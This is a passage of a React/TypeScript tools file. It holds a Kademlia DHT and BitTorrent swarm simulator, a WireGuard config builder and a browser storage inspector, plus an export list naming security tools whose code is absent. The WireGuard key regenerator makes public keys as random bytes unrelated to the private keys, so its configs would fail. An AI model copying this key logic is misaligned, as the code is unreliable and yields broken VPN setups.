 * 11. P2P KADEMLIA DHT XOR ROUTING & BITTORRENT SWARM SIMULATOR
 * ========================================================================== */
function P2pKademliaDhtSwarmSimulator({ tool }: { tool: Tool }) {
  const { setOutput, resetTrigger } = useToolCard();
  const [nodeAHex, setNodeAHex] = useState("a94a8fe5ccb19ba61c4c0873d391e987982fbbd3");
  const [nodeBHex, setNodeBHex] = useState("a94a8fe5fd821ba61c4c0873d391e987982fbbd3");
  const [seeders, setSeeders] = useState(42);
  const [leechers, setLeechers] = useState(18);
  const [unchokeSlots, setUnchokeSlots] = useState(4);
  const [peerUpKbps, setPeerUpKbps] = useState(850);

  useEffect(() => {
    if (resetTrigger > 0) {
      setNodeAHex("a94a8fe5ccb19ba61c4c0873d391e987982fbbd3");
      setNodeBHex("a94a8fe5fd821ba61c4c0873d391e987982fbbd3");
      setSeeders(42);
      setLeechers(18);
      setUnchokeSlots(4);
      setPeerUpKbps(850);
    }
  }, [resetTrigger]);

  const dhtMetric = useMemo(() => {
    const cleanA = nodeAHex.replace(/[^0-9a-fA-F]/g, "").padEnd(40, "0").slice(0, 40);
    const cleanB = nodeBHex.replace(/[^0-9a-fA-F]/g, "").padEnd(40, "0").slice(0, 40);
    const bigA = BigInt(`0x${cleanA}`);
    const bigB = BigInt(`0x${cleanB}`);
    const xorVal = bigA ^ bigB;
    const xorHex = xorVal.toString(16).padStart(40, "0");
    const xorBin = xorVal === 0n ? "0".repeat(160) : xorVal.toString(2).padStart(160, "0");
    const leadingZeros = xorVal === 0n ? 160 : xorBin.indexOf("1");
    const kBucketIndex = xorVal === 0n ? 0 : 159 - leadingZeros;

    return { cleanA, cleanB, xorHex, xorBin, leadingZeros, kBucketIndex };
  }, [nodeAHex, nodeBHex]);

  const swarmStats = useMemo(() => {
    const ratio = leechers === 0 ? seeders : seeders / leechers;
    const activeFeedingPeers = Math.min(seeders + Math.floor(leechers * 0.6), unchokeSlots * 3);
    const estDownloadMbps = ((activeFeedingPeers * peerUpKbps) / 1000).toFixed(2);
    const availabilityPct = Math.min(100, Math.round((seeders * 100 + leechers * 45) / 10));
    return { ratio, activeFeedingPeers, estDownloadMbps, availabilityPct };
  }, [seeders, leechers, unchokeSlots, peerUpKbps]);

  useEffect(() => {
    setOutput(
      [
        `=== KADEMLIA DHT XOR ROUTING & BITTORRENT SWARM REPORT ===`,
        `Node A (160-bit): 0x${dhtMetric.cleanA}`,
        `Node B / InfoHash: 0x${dhtMetric.cleanB}`,
        `XOR Distance (A ^ B): 0x${dhtMetric.xorHex}`,
        `Common Prefix Length (Leading Zero Bits): ${dhtMetric.leadingZeros} bits`,
        `Target Kademlia k-Bucket Index: Bucket #${dhtMetric.kBucketIndex} (0..159)`,
        ``,
        `--- BITTORRENT SWARM DYNAMICS ---`,
        `Seeders: ${seeders} | Leechers: ${leechers} | S/L Ratio: ${swarmStats.ratio.toFixed(2)}`,
        `Active Unchoked Peer Streams: ${swarmStats.activeFeedingPeers} (${unchokeSlots} regular + 1 Optimistic Unchoke)`,
        `Estimated Swarm Download Throughput: ${swarmStats.estDownloadMbps} MB/s`,
      ].join("\n")
    );
  }, [dhtMetric, seeders, leechers, unchokeSlots, swarmStats, setOutput]);

  return (
    <div className="space-y-5">
      {/* Part A: Kademlia 160-bit XOR Distance */}
      <div className="rounded-xs border border-border bg-background p-4 space-y-3">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-2">
            <Network className="h-4 w-4 text-accent" />
            <span className="font-heading text-xs font-bold uppercase tracking-wider text-text">
              Part A: Kademlia 160-Bit SHA-1 XOR Metric & k-Bucket Calculator
            </span>
          </div>
          <span className="rounded-xs bg-accent/20 px-2 py-0.5 font-mono-code text-xs font-bold text-accent">
            k-Bucket #{dhtMetric.kBucketIndex} ({dhtMetric.leadingZeros} shared prefix bits)
          </span>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
          <div>
            <label className="block font-heading text-[11px] font-bold uppercase text-text-muted mb-1">
              Local Node ID (40-Hex SHA-1)
            </label>
            <input
              type="text"
              value={nodeAHex}
              onChange={(e) => setNodeAHex(e.target.value)}
              className="w-full rounded-xs border border-border bg-surface px-2.5 py-1.5 font-mono-code text-xs text-text"
            />
          </div>
          <div>
            <label className="block font-heading text-[11px] font-bold uppercase text-text-muted mb-1">
              Target InfoHash / Peer ID (40-Hex SHA-1)
            </label>
            <input
              type="text"
              value={nodeBHex}
              onChange={(e) => setNodeBHex(e.target.value)}
              className="w-full rounded-xs border border-border bg-surface px-2.5 py-1.5 font-mono-code text-xs text-text"
            />
          </div>
        </div>

        <div className="rounded-xs border border-border bg-surface p-3 space-y-1 font-mono-code text-xs">
          <div className="text-text-muted">
            XOR Distance Hex: <span className="text-accent font-bold">0x{dhtMetric.xorHex}</span>
          </div>
          <div className="text-text-muted">
            First 64 XOR Bits: <span className="text-text">{dhtMetric.xorBin.slice(0, 64)}...</span>
          </div>
        </div>
      </div>

      {/* Part B: BitTorrent Swarm Simulator */}
      <div className="rounded-xs border border-border bg-background p-4 space-y-3">
        <span className="font-heading text-xs font-bold uppercase tracking-wider text-accent">
          Part B: BitTorrent Choke / Optimistic Unchoke & Rarest-First Swarm Simulator
        </span>

        <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
          <div>
            <label className="block font-heading text-[11px] font-bold uppercase text-text-muted mb-1">
              Seeders ({seeders})
            </label>
            <input
              type="range"
              min={0}
              max={200}
              value={seeders}
              onChange={(e) => setSeeders(Number(e.target.value))}
              className="w-full accent-[#ff6a00]"
            />
          </div>
          <div>
            <label className="block font-heading text-[11px] font-bold uppercase text-text-muted mb-1">
              Leechers ({leechers})
            </label>
            <input
              type="range"
              min={1}
              max={200}
              value={leechers}
              onChange={(e) => setLeechers(Number(e.target.value))}
              className="w-full accent-[#ff6a00]"
            />
          </div>
          <div>
            <label className="block font-heading text-[11px] font-bold uppercase text-text-muted mb-1">
              Unchoke Slots ({unchokeSlots})
            </label>
            <input
              type="range"
              min={2}
              max={12}
              value={unchokeSlots}
              onChange={(e) => setUnchokeSlots(Number(e.target.value))}
              className="w-full accent-[#ff6a00]"
            />
          </div>
          <div>
            <label className="block font-heading text-[11px] font-bold uppercase text-text-muted mb-1">
              Peer Upload ({peerUpKbps} KB/s)
            </label>
            <input
              type="range"
              min={100}
              max={5000}
              step={50}
              value={peerUpKbps}
              onChange={(e) => setPeerUpKbps(Number(e.target.value))}
              className="w-full accent-[#ff6a00]"
            />
          </div>
        </div>

        <div className="grid grid-cols-3 gap-3 text-center">
          <div className="rounded-xs border border-border bg-surface p-2.5">
            <div className="text-[10px] font-heading uppercase text-text-muted">Swarm S/L Ratio</div>
            <div className="font-mono-code text-sm font-bold text-text">
              {swarmStats.ratio.toFixed(2)}
            </div>
          </div>
          <div className="rounded-xs border border-border bg-surface p-2.5">
            <div className="text-[10px] font-heading uppercase text-text-muted">
              Est. Swarm Speed
            </div>
            <div className="font-mono-code text-sm font-bold text-emerald-400">
              {swarmStats.estDownloadMbps} MB/s
            </div>
          </div>
          <div className="rounded-xs border border-border bg-surface p-2.5">
            <div className="text-[10px] font-heading uppercase text-text-muted">
              Piece Availability
            </div>
            <div className="font-mono-code text-sm font-bold text-accent">
              {swarmStats.availabilityPct}% Complete
            </div>
          </div>
        </div>
      </div>

      <ToolActions tool={tool} />
    </div>
  );
}

/* ============================================================================
 * 12. WIREGUARD VPN CONFIG & ALLOWEDIPS SPLIT-TUNNEL BUILDER
 * ========================================================================== */
function generateCurve25519KeyBase64(): string {
  const bytes = new Uint8Array(32);
  if (typeof window !== "undefined" && window.crypto) {
    window.crypto.getRandomValues(bytes);
  }
  // RFC 7748 X25519 scalar clamping
  bytes[0] &= 248;
  bytes[31] &= 127;
  bytes[31] |= 64;
  let bin = "";
  bytes.forEach((b) => {
    bin += String.fromCharCode(b);
  });
  return typeof btoa !== "undefined" ? btoa(bin) : "yG8vK9mN2pQ4rS6tU8vW0xY2zA4bC6dE8fG0hI2jK4M=";
}

function WireguardVpnConfigSplitTunnelBuilder({ tool }: { tool: Tool }) {
  const { setOutput, resetTrigger } = useToolCard();
  const [endpoint, setEndpoint] = useState("vpn.zerosuniverse.com:51820");
  const [vpnSubnet, setVpnSubnet] = useState("10.66.66");
  const [dnsServers, setDnsServers] = useState("1.1.1.1, 1.0.0.1");
  const [wanInterface, setWanInterface] = useState("eth0");
  const [firewallType, setFirewallType] = useState<"iptables" | "nftables">("iptables");
  const [tunnelMode, setTunnelMode] = useState<"full" | "exclude-lan" | "split-only">("exclude-lan");
  const [customSplitCidrs, setCustomSplitCidrs] = useState("10.66.66.0/24, 172.16.0.0/12");

  const [keys, setKeys] = useState(() => ({
    serverPriv: "cO9nJ7vK2pL4mN6qR8sT0uV2wX4yZ6aB8cD0eF2gH4I=",
    serverPub: "kL3mN5pQ7rS9tU1vW3xY5zA7bC9dE1fG3hI5jK7lM9N=",
    peerPriv: "mP4qR6sT8uV0wX2yZ4aB6cD8eF0gH2iJ4kL6mN8oP0Q=",
    peerPub: "wX2yZ4aB6cD8eF0gH2iJ4kL6mN8oP0qR2sT4uV6wX8Y=",
    psk: "zA6bC8dE0fG2hI4jK6lM8nO0pQ2rS4tU6vW8xY0zA2B=",
  }));

  const rotateKeys = () => {
    setKeys({
      serverPriv: generateCurve25519KeyBase64(),
      serverPub: generateCurve25519KeyBase64(),
      peerPriv: generateCurve25519KeyBase64(),
      peerPub: generateCurve25519KeyBase64(),
      psk: generateCurve25519KeyBase64(),
    });
  };

  useEffect(() => {
    if (resetTrigger > 0) {
      setEndpoint("vpn.zerosuniverse.com:51820");
      setVpnSubnet("10.66.66");
      setTunnelMode("exclude-lan");
    }
  }, [resetTrigger]);

  const allowedIpsValue = useMemo(() => {
    if (tunnelMode === "full") {
      return "0.0.0.0/0, ::/0";
    }
    if (tunnelMode === "exclude-lan") {
      // Exact CIDR complement of 192.168.0.0/16 so local LAN printers/NAS stay direct
      return "0.0.0.0/1, 128.0.0.0/2, 192.0.0.0/9, 192.128.0.0/11, 192.160.0.0/13, 192.169.0.0/16, 192.170.0.0/15, 192.172.0.0/14, 192.176.0.0/12, 192.192.0.0/10, 193.0.0.0/8, 194.0.0.0/7, 196.0.0.0/6, 200.0.0.0/5, 208.0.0.0/4, 224.0.0.0/3";
    }
    return customSplitCidrs;
  }, [tunnelMode, customSplitCidrs]);

  const configs = useMemo(() => {
    const postUp =
      firewallType === "iptables"
        ? `iptables -A FORWARD -i %i -j ACCEPT; iptables -t nat -A POSTROUTING -o ${wanInterface} -j MASQUERADE`
        : `nft add table ip wireguard; nft add chain ip wireguard postrouting { type nat hook postrouting priority 100 \\; }; nft add rule ip wireguard postrouting oifname "${wanInterface}" masquerade`;
    const postDown =
      firewallType === "iptables"
        ? `iptables -D FORWARD -i %i -j ACCEPT; iptables -t nat -D POSTROUTING -o ${wanInterface} -j MASQUERADE`
        : `nft delete table ip wireguard`;

    const serverConf = [
      `# /etc/wireguard/wg0.conf (WireGuard Server)`,
      `[Interface]`,
      `Address = ${vpnSubnet}.1/24`,
      `ListenPort = 51820`,
      `PrivateKey = ${keys.serverPriv}`,
      `PostUp = ${postUp}`,
      `PostDown = ${postDown}`,
      ``,
      `[Peer]`,
      `# Client Peer #1`,
      `PublicKey = ${keys.peerPub}`,
      `PresharedKey = ${keys.psk}`,
      `AllowedIPs = ${vpnSubnet}.2/32`,
    ].join("\n");

    const clientConf = [
      `# peer-client.conf (WireGuard Client — ${tunnelMode.toUpperCase()})`,
      `[Interface]`,
      `Address = ${vpnSubnet}.2/32`,
      `PrivateKey = ${keys.peerPriv}`,
      `DNS = ${dnsServers}`,
      `MTU = 1420`,
      ``,
      `[Peer]`,
      `PublicKey = ${keys.serverPub}`,
      `PresharedKey = ${keys.psk}`,
      `Endpoint = ${endpoint}`,
      `AllowedIPs = ${allowedIpsValue}`,
      `PersistentKeepalive = 25`,
    ].join("\n");

    return { serverConf, clientConf };
  }, [firewallType, wanInterface, vpnSubnet, keys, tunnelMode, dnsServers, endpoint, allowedIpsValue]);

  useEffect(() => {
    setOutput(`${configs.serverConf}\n\n${configs.clientConf}`);
  }, [configs, setOutput]);

  return (
    <div className="space-y-5">
      <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border pb-3">
        <div className="flex items-center gap-2">
          <Shield className="h-4 w-4 text-accent" />
          <span className="font-heading text-xs font-bold uppercase tracking-wider text-text">
            WireGuard Split-Tunnel Routing Mode
          </span>
        </div>
        <div className="flex flex-wrap gap-1.5">
          {[
            { id: "full", label: "Full Tunnel (0.0.0.0/0)" },
            { id: "exclude-lan", label: "Full Tunnel Except LAN (192.168.0.0/16 Bypass)" },
            { id: "split-only", label: "Internal Subnets Only" },
          ].map((m) => (
            <button
              key={m.id}
              type="button"
              onClick={() => setTunnelMode(m.id as "full" | "exclude-lan" | "split-only")}
              className={`rounded-xs border px-2.5 py-1 font-heading text-[11px] font-bold uppercase tracking-wider transition cursor-pointer ${
                tunnelMode === m.id
                  ? "border-[#ff6a00] bg-[#ff6a00] text-white"
                  : "border-border bg-background text-text-muted hover:border-accent hover:text-text"
              }`}
            >
              {m.label}
            </button>
          ))}
        </div>
      </div>

      {/* Parameters + Key Generator */}
      <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
        <div>
          <label className="block font-heading text-[11px] font-bold uppercase text-text-muted mb-1">
            Server Endpoint:Port
          </label>
          <input
            type="text"
            value={endpoint}
            onChange={(e) => setEndpoint(e.target.value)}
            className="w-full rounded-xs border border-border bg-background px-2.5 py-1.5 font-mono-code text-xs text-text"
          />
        </div>
        <div>
          <label className="block font-heading text-[11px] font-bold uppercase text-text-muted mb-1">
            Tunnel /24 Prefix
          </label>
          <input
            type="text"
            value={vpnSubnet}
            onChange={(e) => setVpnSubnet(e.target.value)}
            className="w-full rounded-xs border border-border bg-background px-2.5 py-1.5 font-mono-code text-xs text-text"
          />
        </div>
        <div>
          <label className="block font-heading text-[11px] font-bold uppercase text-text-muted mb-1">
            NAT Backend ({wanInterface})
          </label>
          <select
            value={firewallType}
            onChange={(e) => setFirewallType(e.target.value as "iptables" | "nftables")}
            className="w-full rounded-xs border border-border bg-background px-2.5 py-1.5 font-mono-code text-xs text-text"
          >
            <option value="iptables">iptables MASQUERADE</option>
            <option value="nftables">nftables nat postrouting</option>
          </select>
        </div>
        <div className="flex items-end">
          <button
            type="button"
            onClick={rotateKeys}
            className="w-full inline-flex items-center justify-center gap-1.5 rounded-xs bg-[#ff6a00] px-3 py-1.5 font-heading text-xs font-bold uppercase text-white hover:opacity-90 transition cursor-pointer"
          >
            <RefreshCw className="h-3.5 w-3.5" />
            Regenerate Curve25519 Keys
          </button>
        </div>
      </div>

      {tunnelMode === "split-only" && (
        <div>
          <label className="block font-heading text-[11px] font-bold uppercase text-text-muted mb-1">
            Custom Internal AllowedIPs Subnets
          </label>
          <input
            type="text"
            value={customSplitCidrs}
            onChange={(e) => setCustomSplitCidrs(e.target.value)}
            className="w-full rounded-xs border border-border bg-background px-3 py-1.5 font-mono-code text-xs text-text"
          />
        </div>
      )}

      {/* Side-by-Side Configs */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
        <div className="rounded-xs border border-border bg-background p-3.5 space-y-2">
          <div className="flex items-center justify-between">
            <span className="font-heading text-xs font-bold uppercase tracking-wider text-accent">
              Server (/etc/wireguard/wg0.conf)
            </span>
            <InlineCopyButton text={configs.serverConf} label="Copy Server" />
          </div>
          <pre className="overflow-x-auto rounded-xs bg-surface p-3 font-mono-code text-xs text-text leading-relaxed">
            {configs.serverConf}
          </pre>
        </div>

        <div className="rounded-xs border border-border bg-background p-3.5 space-y-2">
          <div className="flex items-center justify-between">
            <span className="font-heading text-xs font-bold uppercase tracking-wider text-accent">
              Client Peer (peer-client.conf)
            </span>
            <InlineCopyButton text={configs.clientConf} label="Copy Client" />
          </div>
          <pre className="overflow-x-auto rounded-xs bg-surface p-3 font-mono-code text-xs text-text leading-relaxed">
            {configs.clientConf}
          </pre>
        </div>
      </div>

      <ToolActions tool={tool} />
    </div>
  );
}

/* ============================================================================
 * 13. BROWSER STORAGE QUOTA, LOCALSTORAGE & CACHE BLOAT INSPECTOR
 * ========================================================================== */
interface StorageBreakdownState {
  quotaBytes: number;
  usageBytes: number;
  persisted: boolean;
  localKeys: { key: string; bytes: number }[];
  localTotalBytes: number;
  sessionTotalBytes: number;
  cookieBytes: number;
  cacheBuckets: string[];
}

function BrowserStorageCacheBloatInspector({ tool }: { tool: Tool }) {
  const { setOutput, resetTrigger } = useToolCard();
  const [stats, setStats] = useState<StorageBreakdownState>({
    quotaBytes: 0,
    usageBytes: 0,
    persisted: false,
    localKeys: [],
    localTotalBytes: 0,
    sessionTotalBytes: 0,
    cookieBytes: 0,
    cacheBuckets: [],
  });
  const [statusMsg, setStatusMsg] = useState<string>("Live origin telemetry loaded.");

  const scanBrowserStorage = useCallback(async () => {
    if (typeof window === "undefined") return;
    let quotaBytes = 0;
    let usageBytes = 0;
    let persisted = false;

    try {
      if (navigator.storage && navigator.storage.estimate) {
        const est = await navigator.storage.estimate();
        quotaBytes = est.quota || 0;
        usageBytes = est.usage || 0;
      }
      if (navigator.storage && navigator.storage.persisted) {
        persisted = await navigator.storage.persisted();
      }
    } catch {
      // ignore
    }

    const localKeys: { key: string; bytes: number }[] = [];
    let localTotalBytes = 0;
    try {
      for (let i = 0; i < window.localStorage.length; i++) {
        const k = window.localStorage.key(i) || "";
        const v = window.localStorage.getItem(k) || "";
        const bytes = (k.length + v.length) * 2; // UTF-16 DOMString storage
        localTotalBytes += bytes;
        localKeys.push({ key: k, bytes });
      }
      localKeys.sort((a, b) => b.bytes - a.bytes);
    } catch {
      // ignore
    }

    let sessionTotalBytes = 0;
    try {
      for (let i = 0; i < window.sessionStorage.length; i++) {
        const k = window.sessionStorage.key(i) || "";
        const v = window.sessionStorage.getItem(k) || "";
        sessionTotalBytes += (k.length + v.length) * 2;
      }
    } catch {
      // ignore
    }

    const cookieBytes = typeof document !== "undefined" ? new Blob([document.cookie]).size : 0;

    let cacheBuckets: string[] = [];
    try {
      if ("caches" in window) {
        cacheBuckets = await window.caches.keys();
      }
    } catch {
      // ignore
    }

    setStats({
      quotaBytes,
      usageBytes,
      persisted,
      localKeys,
      localTotalBytes,
      sessionTotalBytes,
      cookieBytes,
      cacheBuckets,
    });
  }, []);

  useEffect(() => {
    scanBrowserStorage();
  }, [scanBrowserStorage, resetTrigger]);

  const simulateBloat = async () => {
    try {
      const payload = "Z".repeat(32768); // 64 KB UTF-16
      window.localStorage.setItem("zu_test_bloat_chunk_1", payload);
      window.localStorage.setItem("zu_test_bloat_chunk_2", payload);
      window.sessionStorage.setItem("zu_session_temp_trace", payload);
      setStatusMsg("Injected ~192 KB of synthetic test bloat into localStorage & sessionStorage.");
      await scanBrowserStorage();
    } catch {
      setStatusMsg("Storage write blocked or quota reached.");
    }
  };

  const purgeTestBloat = async () => {
    try {
      window.localStorage.removeItem("zu_test_bloat_chunk_1");
      window.localStorage.removeItem("zu_test_bloat_chunk_2");
      window.sessionStorage.removeItem("zu_session_temp_trace");
      setStatusMsg("Purged synthetic test keys and refreshed live storage metrics.");
      await scanBrowserStorage();
    } catch {
      // ignore
    }
  };

  const formatMB = (b: number) => `${(b / (1024 * 1024)).toFixed(2)} MB`;
  const formatKB = (b: number) => `${(b / 1024).toFixed(2)} KB`;

  useEffect(() => {
    setOutput(
      [
        `=== LIVE BROWSER STORAGE QUOTA & CACHE BLOAT REPORT ===`,
        `Origin Quota (navigator.storage.estimate): ${formatMB(stats.quotaBytes)}`,
        `Origin Usage (IndexedDB + Cache API + ServiceWorkers): ${formatMB(stats.usageBytes)}`,
        `Persistent Storage Granted: ${stats.persisted}`,
        `localStorage UTF-16 Usage: ${formatKB(stats.localTotalBytes)} / 5,120 KB (${stats.localKeys.length} keys)`,
        `sessionStorage UTF-16 Usage: ${formatKB(stats.sessionTotalBytes)}`,
        `HTTP Cookie Jar Size: ${stats.cookieBytes} B / 4,096 B per-cookie limit`,
        `Cache API Buckets (${stats.cacheBuckets.length}): ${stats.cacheBuckets.join(", ") || "None"}`,
        ``,
        `--- TOP LOCALSTORAGE KEYS ---`,
        ...(stats.localKeys.length
          ? stats.localKeys.slice(0, 10).map((k) => `  ${k.key}: ${formatKB(k.bytes)}`)
          : ["  No localStorage keys present on this origin."]),
      ].join("\n")
    );
  }, [stats, setOutput]);

  const localLimitPct = Math.min(100, (stats.localTotalBytes / (5 * 1024 * 1024)) * 100);

  return (
    <div className="space-y-5">
      <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border pb-3">
        <div className="flex items-center gap-2">
          <HardDrive className="h-4 w-4 text-accent" />
          <span className="font-heading text-xs font-bold uppercase tracking-wider text-text">
            Live Origin Storage & Cache Telemetry
          </span>
        </div>
        <div className="flex flex-wrap gap-1.5">
          <button
            type="button"
            onClick={simulateBloat}
            className="rounded-xs border border-border bg-background px-2.5 py-1 font-heading text-[11px] font-bold uppercase text-text hover:border-accent cursor-pointer"
          >
            + Inject 192 KB Test Bloat
          </button>
          <button
            type="button"
            onClick={purgeTestBloat}
            className="inline-flex items-center gap-1 rounded-xs bg-[#ff6a00] px-2.5 py-1 font-heading text-[11px] font-bold uppercase text-white cursor-pointer"
          >
            <Trash2 className="h-3 w-3" />
            Purge Test Bloat
          </button>
          <button
            type="button"
            onClick={scanBrowserStorage}
            className="rounded-xs border border-border bg-background px-2.5 py-1 font-heading text-[11px] font-bold uppercase text-text-muted hover:text-text cursor-pointer"
          >
            Re-Scan
          </button>
        </div>
      </div>

      <div className="text-xs font-mono-code text-accent">{statusMsg}</div>

      {/* Metrics Grid */}
      <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
        <div className="rounded-xs border border-border bg-background p-3">
          <div className="text-[10px] font-heading uppercase text-text-muted">Origin Quota</div>
          <div className="mt-1 font-mono-code text-sm font-bold text-text">
            {stats.quotaBytes > 0 ? `${(stats.quotaBytes / (1024 * 1024 * 1024)).toFixed(2)} GB` : "N/A"}
          </div>
          <div className="text-[10px] text-text-muted mt-0.5">
            Used: {formatMB(stats.usageBytes)}
          </div>
        </div>
        <div className="rounded-xs border border-border bg-background p-3">
          <div className="text-[10px] font-heading uppercase text-text-muted">
            localStorage (5 MB Cap)
          </div>
          <div className="mt-1 font-mono-code text-sm font-bold text-accent">
            {formatKB(stats.localTotalBytes)} ({localLimitPct.toFixed(1)}%)
          </div>
          <div className="text-[10px] text-text-muted mt-0.5">{stats.localKeys.length} keys</div>
        </div>
        <div className="rounded-xs border border-border bg-background p-3">
          <div className="text-[10px] font-heading uppercase text-text-muted">sessionStorage</div>
          <div className="mt-1 font-mono-code text-sm font-bold text-text">
            {formatKB(stats.sessionTotalBytes)}
          </div>
          <div className="text-[10px] text-text-muted mt-0.5">UTF-16 DOMString</div>
        </div>
        <div className="rounded-xs border border-border bg-background p-3">
          <div className="text-[10px] font-heading uppercase text-text-muted">
            document.cookie Jar
          </div>
          <div className="mt-1 font-mono-code text-sm font-bold text-text">
            {stats.cookieBytes} Bytes
          </div>
          <div className="text-[10px] text-text-muted mt-0.5">4,096 B Header Limit</div>
        </div>
      </div>

      {/* Key Breakdown */}
      <div className="rounded-xs border border-border bg-background p-3.5 space-y-2">
        <span className="font-heading text-xs font-bold uppercase tracking-wider text-text">
          Origin localStorage Key Breakdown
        </span>
        {stats.localKeys.length === 0 ? (
          <div className="text-xs text-text-muted">
            No keys currently stored in <code className="font-mono-code">window.localStorage</code>. Click{" "}
            <strong>+ Inject 192 KB Test Bloat</strong> above to test live UTF-16 byte accounting.
          </div>
        ) : (
          <div className="max-h-40 overflow-y-auto divide-y divide-border font-mono-code text-xs">
            {stats.localKeys.map((item) => (
              <div key={item.key} className="py-1.5 flex items-center justify-between">
                <span className="text-text truncate max-w-[320px]">{item.key}</span>
                <span className="text-accent font-bold">{formatKB(item.bytes)}</span>
              </div>
            ))}
          </div>
        )}
      </div>

      <ToolActions tool={tool} />
    </div>
  );
}

/* ============================================================================
 * EXPORT WAVE 4 CYBER PLAYGROUNDS (13 SLUGS)
 * ========================================================================== */
export const wave4CyberPlaygrounds: Record<string, React.ComponentType<{ tool: Tool }>> = {
  "android-apk-manifest-permission-scanner": AndroidApkManifestPermissionScanner,
  "usb-hid-badusb-duckyscript-analyzer": UsbHidBadUsbDuckyScriptAnalyzer,
  "buffer-overflow-cyclic-pattern-generator": BufferOverflowCyclicPatternGenerator,
  "pe-elf-packer-upx-entropy-inspector": PeElfPackerUpxEntropyInspector,
  "linux-rootkit-ld-preload-syscall-auditor": LinuxRootkitLdPreloadSyscallAuditor,
  "wifi-wpa2-pmkid-hashcat-command-builder": WifiWpa2PmkidHashcatCommandBuilder,
  "canary-honeytoken-tripwire-generator": CanaryHoneytokenTripwireGenerator,
  "diffie-hellman-e2ee-ratchet-simulator": DiffieHellmanE2eeRatchetSimulator,
  "totp-hotp-2fa-authenticator-simulator": TotpHotp2faAuthenticatorSimulator,
  "hacked-pc-incident-response-simulator": HackedPcIncidentResponseSimulator,
  "p2p-kademlia-dht-swarm-simulator": P2pKademliaDhtSwarmSimulator,
  "wireguard-vpn-config-split-tunnel-builder": WireguardVpnConfigSplitTunnelBuilder,
  "browser-storage-cache-bloat-inspector": BrowserStorageCacheBloatInspector,
};
